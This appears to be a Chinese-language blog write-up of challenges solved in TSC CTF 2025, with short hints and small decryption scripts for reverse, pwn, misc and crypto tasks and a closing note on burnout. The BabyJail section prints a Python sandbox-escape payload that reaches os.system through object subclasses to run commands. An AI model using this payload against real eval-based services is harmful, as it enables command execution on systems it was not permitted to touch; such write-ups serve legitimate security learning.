---
title: TSC CTF 2025 - write-up
published: 2025-01-24
description: '講述在 TSC CTF 2025 中 所解的的題目'
image: 'CTF.png'
tags: [CTF,write-up,Cyber Secutity]
category: 'CTF'
draft: false 
---

## Reverse

### What_Happened

GDB 動態分析的題目  
直接使用 x64dbg patch 然後讓他跳到 decrypt_flag 函式中
擷取其中的 Flag 即可

### Chill Checker

```cpp=
// 解題腳本：
#include <stdio.h>

void find_input() {
    char target[] = "SGZIYIHW";
    char input[9]; // 最多 8 字元 + 結尾 '\0'
    int a2, result;
    
    for (int j = 0; j < 8; ++j) {
        a2 = j + 8;
        result = ((target[j] - 65 - (31 * a2 % 26) + 26) % 26) + 65;
        input[j] = result;
    }
    input[8] = '\0'; // 字串結尾
    printf("Correct input: %s\n", input);
}

int main() {
    find_input();
    return 0;
}
```

## Pwn

### gamble_bad_bad

填充字串讓他超過長度之後，獲取Flag

## Misc

### Subdomain Hijacking

~~全部字母都試一遍~~  
之後就會找到一個 `Target`的關鍵字

### BabyJail

經典的 eval 的漏洞，但有一些限制  
找到了以下的 payload  
```python=
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("指令內容")
```


## Crypto

### Very Simple Login

沒有驗證使用者，直接使用 Admin 註冊
然後利用加密出來的 key 登入就可以 get flag

### Classic

```python=
cipher = "o`15~UN;;U~;F~U0OkW;FNW;F]WNlUGV\""
charset = (
    "0123456789"
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
)

A = 29
B = 27
A_inv = 13

plain = []
for c in cipher:
    enc_idx = charset.find(c)
    p_idx = ((enc_idx - B) * A_inv) % 94
    plain.append(charset[p_idx])

plaintext = "".join(plain)
print("解密結果:", plaintext)

```

## 心得
這次比賽，打到了 105th  
同時最近有感覺到疲倦期  
沒有這麼多時間打 CTF 或其他資安的事  
然後對於這件事的熱情沒有像之前這麼強  
可能最近真的太忙了  
![image](https://hackmd.io/_uploads/rkyvA7bukx.png)
